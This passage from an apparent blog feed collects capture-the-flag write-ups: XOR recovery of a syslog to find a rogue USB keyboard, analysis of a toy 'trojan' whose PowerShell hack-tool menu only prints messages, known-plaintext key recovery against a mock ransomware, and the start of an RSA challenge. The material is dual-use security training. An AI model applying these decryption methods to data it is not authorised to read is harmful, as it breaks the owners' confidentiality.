&lt;span style="color:#f92672">&amp;#34;pid&amp;#34;&lt;/span>: [
&lt;span style="color:#e6db74">&amp;#34;0002&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;0003&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;0129&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;0608&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;12a8&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;3491&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;56dd&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
],
&lt;span style="color:#f92672">&amp;#34;prod&amp;#34;&lt;/span>: [
&lt;span style="color:#e6db74">&amp;#34;USB2.0 HD UVC WebCam&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;USB2.0 Hub&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;USB2.0-CRW&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;iPhone&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;xHCI Host Controller&amp;#34;&lt;/span>
],
&lt;span style="color:#f92672">&amp;#34;serial&amp;#34;&lt;/span>: [
&lt;span style="color:#e6db74">&amp;#34;0000:03:00.3&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;0000:03:00.4&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;0x0001&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;20100201396000000&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;4b8d611f609abfc5471ae40d08d0c8b785eab9d4&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
],
&lt;span style="color:#f92672">&amp;#34;vid&amp;#34;&lt;/span>: [
&lt;span style="color:#e6db74">&amp;#34;05ac&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;05e3&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;0bda&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;13d3&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;1d6b&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
]
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The goal of the challenge is to find the serial number of the rubber ducky which was connected to the machine for which we have the syslog.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ file syslog.enc
syslog.enc: data
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The file doesn&amp;rsquo;t look like any well known format, so we can assume (quite safely) that the encryption is a simple XOR. We&amp;rsquo;ll use &lt;a href="https://blog.didierstevens.com/2016/01/01/xor-known-plaintext-attack/">the known plaintext XOR tool from Didier Stevens&lt;/a>.&lt;/p>
&lt;p>A good candidate for the plaintext is &lt;code>Linux 5.10.0-kali8-amd64 xhci-hcd&lt;/code>, which will surely appear.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python2 xor-kpa.py -d &amp;lt;&lt;span style="color:#f92672">(&lt;/span>echo &lt;span style="color:#e6db74">&amp;#39;Linux 5.10.0-kali8-amd64 xhci-hcd&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> syslog.enc &amp;gt; syslog
$ head -n &lt;span style="color:#ae81ff">5&lt;/span> syslog
Jun &lt;span style="color:#ae81ff">7&lt;/span> 22:53:25 kali usbmuxd&lt;span style="color:#f92672">[&lt;/span>117991&lt;span style="color:#f92672">]&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>22:53:25.287&lt;span style="color:#f92672">][&lt;/span>3&lt;span style="color:#f92672">]&lt;/span> Connecting to new device on location 0x10004 as ID &lt;span style="color:#ae81ff">1&lt;/span>
Jun &lt;span style="color:#ae81ff">7&lt;/span> 22:53:25 kali usbmuxd&lt;span style="color:#f92672">[&lt;/span>117991&lt;span style="color:#f92672">]&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>22:53:25.287&lt;span style="color:#f92672">][&lt;/span>3&lt;span style="color:#f92672">]&lt;/span> Connected to v2.0 device &lt;span style="color:#ae81ff">1&lt;/span> on location 0x10004 with serial number 4b8d611f609abfc5471ae40d08d0c8b785eab9d4
Jun &lt;span style="color:#ae81ff">7&lt;/span> 22:53:27 kali ModemManager&lt;span style="color:#f92672">[&lt;/span>830&lt;span style="color:#f92672">]&lt;/span>: &amp;lt;info&amp;gt; &lt;span style="color:#f92672">[&lt;/span>base-manager&lt;span style="color:#f92672">]&lt;/span> couldn&lt;span style="color:#e6db74">&amp;#39;t check support for device &amp;#39;&lt;/span>/sys/devices/pci0000:00/0000:00:08.1/0000:03:00.3/usb1/1-2&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>: not supported by any plugin
Jun &lt;span style="color:#ae81ff">8&lt;/span> 00:16:16 kali lynis&lt;span style="color:#f92672">[&lt;/span>144261&lt;span style="color:#f92672">]&lt;/span>: - usbmuxd.service: &lt;span style="color:#f92672">[&lt;/span> UNSAFE &lt;span style="color:#f92672">]&lt;/span>
Jun &lt;span style="color:#ae81ff">8&lt;/span> 00:16:22 kali lynis&lt;span style="color:#f92672">[&lt;/span>118776&lt;span style="color:#f92672">]&lt;/span>: - Checking usb-storage driver &lt;span style="color:#f92672">(&lt;/span>modprobe config&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span> NON DESACTIVÃ‰ &lt;span style="color:#f92672">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>That seems like a valid syslog! After looking for a short while, we find:&lt;/p>
&lt;pre>&lt;code>Apr 12 20:21:25 kali kernel: [ 1.830063] usb 1-2: Product: Fake_KeyBoard
Apr 12 20:21:25 kali kernel: [ 1.830064] usb 1-2: Manufacturer: APT43.
Apr 12 20:21:25 kali kernel: [ 1.830065] usb 1-2: SerialNumber: 854be9ee57ef47ce74e73904998d61c8846e9239
&lt;/code>&lt;/pre>&lt;p>The flag is &lt;code>CYBERTF{854be9ee57ef47ce74e73904998d61c8846e9239}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/usb-key-cemetery">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Trojan tools</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-trojan-tools/</link><pubDate>Sun, 11 Jul 2021 06:57:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-trojan-tools/</guid><description>For this challenge, we were given a TROJAN_TOOLS.exe file. Before manually analyzing it, I tried feeding it to hybrid analysis.
Here is the link to the full report.
The &amp;ldquo;Interesting strings&amp;rdquo; section contained the flag: CYBERTF{Y0u_H4s_P3wn_Th3_H4ck_T0ol}.
We can also try to solve the challenge in a more conventional way. Executing the application gives us:
C:\Users\IEUser\Desktop&amp;gt;original.exe Please enter the good PIN Using a process monitor We can use procmon from the Sysinternals suite to monitor the process.</description><content>&lt;p>For this challenge, we were given a &lt;code>TROJAN_TOOLS.exe&lt;/code> file. Before manually analyzing it, I tried feeding it to &lt;a href="https://www.hybrid-analysis.com/">hybrid analysis&lt;/a>.&lt;/p>
&lt;p>Here is the link to &lt;a href="https://www.hybrid-analysis.com/sample/fe5b78b039a6800a2ae00db12559e971cc0a02caa72e29826d3e51ce88eb153b/60e02fcf19a4185d8f58ead3">the full report&lt;/a>.&lt;/p>
&lt;p>The &amp;ldquo;Interesting strings&amp;rdquo; section contained the flag: &lt;code>CYBERTF{Y0u_H4s_P3wn_Th3_H4ck_T0ol}&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>We can also try to solve the challenge in a more conventional way. Executing the application gives us:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ps" data-lang="ps">&lt;span style="color:#a6e22e">C:\Users\IEUser\Desktop&lt;/span>&amp;gt;&lt;span style="color:#a6e22e">original.exe&lt;/span>
&lt;span style="color:#a6e22e">Please&lt;/span> &lt;span style="color:#a6e22e">enter&lt;/span> &lt;span style="color:#a6e22e">the&lt;/span> &lt;span style="color:#a6e22e">good&lt;/span> &lt;span style="color:#a6e22e">PIN&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="using-a-process-monitor">Using a process monitor&lt;/h2>
&lt;p>We can use &lt;a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">procmon&lt;/a> from the Sysinternals suite to monitor the process.&lt;/p>
&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/reverse-trojan-tools.png" alt="Procmon monitoring for the executable showing a WriteFile call" class="center" />
&lt;p>We can see that a file is created and written to. It is deleted once the executable is done running, but there probably is a call to &lt;code>Sleep&lt;/code> because we can open it in notepad if we&amp;rsquo;re fast enough.&lt;/p>
&lt;p>Here is is, containing the flag:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="color:#66d9ef">Param&lt;/span>($choix)
&lt;span style="color:#66d9ef">if&lt;/span>($choix &lt;span style="color:#f92672">-eq&lt;/span> 5383)
{
Write-Host &lt;span style="color:#e6db74">&amp;#34;Welcome to HackTool &lt;/span>&lt;span style="color:#ae81ff">`r`n`r`n`r`n&lt;/span>&lt;span style="color:#e6db74">===MENU===&lt;/span>&lt;span style="color:#ae81ff">`r`n&lt;/span>&lt;span style="color:#e6db74">1)FUD PAYLOAD&lt;/span>&lt;span style="color:#ae81ff">`r`n&lt;/span>&lt;span style="color:#e6db74">2)DDOS&lt;/span>&lt;span style="color:#ae81ff">`r`n&lt;/span>&lt;span style="color:#e6db74">3)Personnal note&amp;#34;&lt;/span>
$userChoice = Read-Host &lt;span style="color:#e6db74">&amp;#34;Enter your choice : &amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span>($userChoice &lt;span style="color:#f92672">-eq&lt;/span> 1)
{
$trojanPath = Read-Host &lt;span style="color:#e6db74">&amp;#34;Enter path of payload : &amp;#34;&lt;/span>
Write-Host &lt;span style="color:#e6db74">&amp;#34;Obfuscating in progress...&amp;#34;&lt;/span>
Write-Host &lt;span style="color:#e6db74">&amp;#34;The payload $trojanPath is now obufscated !&amp;#34;&lt;/span>
Write-Error &lt;span style="color:#e6db74">&amp;#34;CRITICAL ERROR, IMPOSSIBLE TO OBFUSCATING PAYLOAD&amp;#34;&lt;/span>
}
&lt;span style="color:#66d9ef">ElseIf&lt;/span> ($userChoice &lt;span style="color:#f92672">-eq&lt;/span> 2)
{
$ipToAttack = Read-Host &lt;span style="color:#e6db74">&amp;#34;Enter IP to Ddos : &amp;#34;&lt;/span>
$portToAttack = Read-Host &lt;span style="color:#e6db74">&amp;#34;Enter port of target : &amp;#34;&lt;/span>
Write-Host &lt;span style="color:#e6db74">&amp;#34;ATTACK STARTED to $ipToAttack : $portToAttack&amp;#34;&lt;/span>
Write-Host &lt;span style="color:#e6db74">&amp;#34;500 requests sended...&amp;#34;&lt;/span>
Write-Error &lt;span style="color:#e6db74">&amp;#34;CRITICAL ERROR, IMPOSSIBLE TO SEND PACKET&amp;#34;&lt;/span>
}
&lt;span style="color:#66d9ef">ElseIF&lt;/span> ($userChoice &lt;span style="color:#f92672">-eq&lt;/span> 3)
{
Write-Error &lt;span style="color:#e6db74">&amp;#34;ERROR, OPTION 3 IS NOT INCORPORED PLEASE TRY 1 BETWEEN 10&amp;#34;&lt;/span>
}
&lt;span style="color:#66d9ef">ElseIF&lt;/span> ($userChoice &lt;span style="color:#f92672">-eq&lt;/span> 8)
{
Write-Host &lt;span style="color:#e6db74">&amp;#34;CYBERTF{Y0u_H4s_P3wn_Th3_H4ck_T0ol}&amp;#34;&lt;/span>
}
&lt;span style="color:#66d9ef">Else&lt;/span>
{
Write-Error &lt;span style="color:#e6db74">&amp;#34;ERROR, OPTION $userChoice IS NOT INCORPORED PLEASE TRY 1 BETWEEN 10&amp;#34;&lt;/span>
}
}
&lt;span style="color:#66d9ef">else&lt;/span>
{
Write-Host &lt;span style="color:#e6db74">&amp;#34;Please enter the good PIN&amp;#34;&lt;/span>
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="unpacking-the-executable">Unpacking the executable&lt;/h2>
&lt;p>I also noticed that the application was packed using &lt;a href="https://upx.github.io/">UPX&lt;/a>, and that when unpacked, it
contained the string &lt;code>inflate 1.2.8 Copyright 1995-2013 Mark Adler&lt;/code>. This probably indicates nested zlib data. I couldn&amp;rsquo;t find a way to extract anything else though: binwalk gives files that are almost fully filled with null bytes. And &lt;a href="https://github.com/horsicq/Detect-It-Easy">Detect It Easy&lt;/a> doesn&amp;rsquo;t help either.&lt;/p>
&lt;h2 id="more">More&lt;/h2>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/trojan-tools">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Viking crypt</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-viking-crypt/</link><pubDate>Sun, 11 Jul 2021 05:07:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-viking-crypt/</guid><description>For this challenge, we were given a ransomware (VIKING_CRYPT.exe and VIKING_DECRYPT.exe) along with a LOCKER.HTML file and IMPORTANT_NOTE.txt.vkg.
Let&amp;rsquo;s take a look at that encrypted note:
$ file Perso/IMPORTANT_NOTE.txt.vkg Perso/IMPORTANT_NOTE.txt.vkg: ASCII text, with no line terminators $ cat Perso/IMPORTANT_NOTE.txt.vkg 8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849 It doesn&amp;rsquo;t really look like any encryption I know.
We can try to run VIKING_DECRYPT.exe:
As expected, we&amp;rsquo;re asked for a decryption key. Let&amp;rsquo;s encrypt a few files in a VM, and compare the plaintext and the .</description><content>&lt;p>For this challenge, we were given a ransomware (&lt;code>VIKING_CRYPT.exe&lt;/code> and &lt;code>VIKING_DECRYPT.exe&lt;/code>) along with a &lt;code>LOCKER.HTML&lt;/code> file and &lt;code>IMPORTANT_NOTE.txt.vkg&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/viking-locker.png" alt="Viking locker ransom message">&lt;/p>
&lt;p>Let&amp;rsquo;s take a look at that encrypted note:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ file Perso/IMPORTANT_NOTE.txt.vkg
Perso/IMPORTANT_NOTE.txt.vkg: ASCII text, with no line terminators
$ cat Perso/IMPORTANT_NOTE.txt.vkg
8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849
&lt;/code>&lt;/pre>&lt;/div>&lt;p>It doesn&amp;rsquo;t really look like any encryption I know.&lt;/p>
&lt;p>We can try to run &lt;code>VIKING_DECRYPT.exe&lt;/code>:&lt;/p>
&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/viking-locker-decrypt.png" alt="Viking locker decrypt executable" class="center" />
&lt;p>As expected, we&amp;rsquo;re asked for a decryption key. Let&amp;rsquo;s encrypt a few files in a VM, and compare the plaintext and the &lt;code>.vkg&lt;/code> files.&lt;/p>
&lt;p>Note: the challenge description tells us that, for safety, the malware will only encrypt files in &lt;code>C:\Users\nMnHkfcWUjE\Desktop\Perso&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ echo &lt;span style="color:#e6db74">&amp;#39;hello world&amp;#39;&lt;/span> &amp;gt; normal.txt
$ echo &lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span> &amp;gt; leet.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ps" data-lang="ps">&lt;span style="color:#a6e22e">PS&lt;/span> &lt;span style="color:#a6e22e">C:\Users\nMnHkfcWUjE\Desktop&lt;/span>&amp;gt; &lt;span style="color:#a6e22e">.\VIKING_CRYPT.exe&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cat normal.txt.vkg
a1a74e2267006c2df04f5e
$ cat leet.txt.vkg
a1f1137f38006c72f0125e
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now this is promising. The matching &lt;code>h&lt;/code> has the same value. Let&amp;rsquo;s try a simple xor between the plaintext and the encrypted value, to see if we get a matching key:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#f92672">import&lt;/span> codecs
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">print&lt;/span>([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hello world&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1a74e2267006c2df04f5e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))])
[&lt;span style="color:#ae81ff">201&lt;/span>, &lt;span style="color:#ae81ff">194&lt;/span>, &lt;span style="color:#ae81ff">34&lt;/span>, &lt;span style="color:#ae81ff">78&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#ae81ff">27&lt;/span>, &lt;span style="color:#ae81ff">66&lt;/span>, &lt;span style="color:#ae81ff">130&lt;/span>, &lt;span style="color:#ae81ff">35&lt;/span>, &lt;span style="color:#ae81ff">58&lt;/span>]
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">print&lt;/span>([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1f1137f38006c72f0125e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))])
[&lt;span style="color:#ae81ff">201&lt;/span>, &lt;span style="color:#ae81ff">194&lt;/span>, &lt;span style="color:#ae81ff">34&lt;/span>, &lt;span style="color:#ae81ff">78&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#ae81ff">27&lt;/span>, &lt;span style="color:#ae81ff">66&lt;/span>, &lt;span style="color:#ae81ff">130&lt;/span>, &lt;span style="color:#ae81ff">35&lt;/span>, &lt;span style="color:#ae81ff">58&lt;/span>]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The key is exactly the same! Let&amp;rsquo;s try decrypting our important note:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> [a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1f1137f38006c72f0125e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">print&lt;/span>(bytes([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(key, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]))
&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CYBERTF{I_D&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Well that&amp;rsquo;s only the start of the flag. Let&amp;rsquo;s encrypt something longer, to get more bytes of the key:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ echo &lt;span style="color:#e6db74">&amp;#39;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non enim quam. Morbi luctus tortor dolor, sed pellentesque urna vestibulum eget. In egestas diam tempus risus molestie, id consectetur ante euismod. Integer eget erat sapien.&amp;#39;&lt;/span> &amp;gt; long.txt
$ &lt;span style="color:#75715e"># Run VIKING_CRYPT.exe&lt;/span>
$ cat long.txt.vkg
85ad502b65007232f15657689af325bbccc6cb4f9ca7129f24074a1bb65bc8c30162703e3f36149f38c754567af424eb60682eda379edab1b7fe5b44c4df29c471f802c8d8716192291c829b89c3c49695ec48abf2f3721e5b229a20afb2b7c751779c51ff63f378a7a53c27113b306c26fc2b87562768cc82b70cfdbd3fc93730f890234ac890c6e6b9e052f65341eaaf3f7e56d9476c170f17dd5e3830867656c0fd885a68a55ae58bcb182a09ee0a840a03511fb3222d25637b1d344340168dfebdd97a8bc327a36e6d9703f9e6427e9dfd07df86f0140a067a3a843aeef6f4782df2f1e56e380957c2
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> cleartext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non enim quam. Morbi luctus tortor dolor, sed pellentesque urna vestibulum eget. In egestas diam tempus risus molestie, id consectetur ante euismod. Integer eget erat sapien.&amp;#39;&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> cipher &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;85ad502b65007232f15657689af325bbccc6cb4f9ca7129f24074a1bb65bc8c30162703e3f36149f38c754567af424eb60682eda379edab1b7fe5b44c4df29c471f802c8d8716192291c829b89c3c49695ec48abf2f3721e5b229a20afb2b7c751779c51ff63f378a7a53c27113b306c26fc2b87562768cc82b70cfdbd3fc93730f890234ac890c6e6b9e052f65341eaaf3f7e56d9476c170f17dd5e3830867656c0fd885a68a55ae58bcb182a09ee0a840a03511fb3222d25637b1d344340168dfebdd97a8bc327a36e6d9703f9e6427e9dfd07df86f0140a067a3a843aeef6f4782df2f1e56e380957c2&amp;#39;&lt;/span>
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> [a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(cleartext, codecs&lt;span style="color:#f92672">.&lt;/span>decode(cipher, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]
&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">print&lt;/span>(bytes([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(key, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]))
&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CYBERTF{I_D0nt_P4y_Th3_R4ns0m}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{I_D0nt_P4y_Th3_R4ns0m}&lt;/code>.&lt;/p>
&lt;p>By the way, the key doesn&amp;rsquo;t seem to repeat (at least for the first 235 values), so it&amp;rsquo;s probably made from a RNG.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/viking-crypt">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : (Un)Efficient encryption</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-unefficient-encryption/</link><pubDate>Sat, 10 Jul 2021 23:12:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-unefficient-encryption/</guid><description>For this challenge, we were given two pcapng files, comm1.pcapng and comm2.pcapng, and a text file. The text file contains this:
Bonjour Agent-CTF,
Nous avons recemment interceptÃ©s un message, chiffrÃ© grace a un algorithme inconnu. Nous avons mis en relation ce message a un message anterieur, contenant une discussion suspecte entre deux membres de l&amp;rsquo;APT.
Votre mission sera de dechiffrer les communications.
Bonne chance
Q.G.
We can use tshark to view the raw data of the network captures:</description><content>&lt;p>For this challenge, we were given two pcapng files, &lt;code>comm1.pcapng&lt;/code> and &lt;code>comm2.pcapng&lt;/code>, and a text file. The text file contains this:&lt;/p>
&lt;blockquote>
&lt;p>Bonjour Agent-CTF,&lt;/p>
&lt;p>Nous avons recemment interceptÃ©s un message, chiffrÃ© grace a un algorithme inconnu.
Nous avons mis en relation ce message a un message anterieur, contenant une discussion suspecte entre deux membres de l&amp;rsquo;APT.&lt;/p>
&lt;p>Votre mission sera de dechiffrer les communications.&lt;/p>
&lt;p>Bonne chance&lt;/p>
&lt;p>Q.G.&lt;/p>
&lt;/blockquote>
&lt;p>We can use tshark to view the raw data of the network captures:&lt;/p>
&lt;pre>&lt;code class="language-cli" data-lang="cli">$ tshark -r comm1.pcapng -T fields -e data | xxd -r -p
Hey, could you generate an rsa key for me ? I Dont know how to do it
Yes sure, i just need a prime integer to generate it
Just take a random one, like 347 for example
Perfect, i'll keep you in touch
$ tshark -r comm2.pcapng -T fields -e data | xxd -r -p
Hello
-----BEGIN PUBLIC KEY-----
MBwwDQYJKoZIhvcNAQEBBQADCwAwCAIDBGOvAgER
-----END PUBLIC KEY-----
71436 176304 185211 110406 35389 179680 56238 185211 207993 237729 176304 207993 185211 192576 237729 95070 171155 207993 35389 185211 110406 140230 92028 110406 140230 246626 82805
95994 185211 110406 176304 192576 230623 185211 110406 237729 171155 110406 247756 185211 192576 230623 185211 110406 237729 176304 140230 92028 110406 232955 247756 192576 35389 185211 82805
194813 185211 207993 185211 110406 140230 92028 110406 237729 176304 185211 110406 92028 185211 35389 207993 185211 237729 110406 35389 171155 171098 185211 110406 105244 110406 228171 207520 180458 196399 104282 71436 31634 106170 103296 132591 35389 69499 171098 196399 24720 104282 92028 59381 24720 230238 230238 36350
&lt;/code>&lt;/pre>&lt;p>The first message tells us about a message encrypted using RSA, for which a factor is 347. The second message contains the public key, and the message itself (the value of each char).&lt;/p>
&lt;p>We can be lazy and use &lt;a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool&lt;/a> to get ourselves the private key parameters, after copying the public key to a file.&lt;/p>
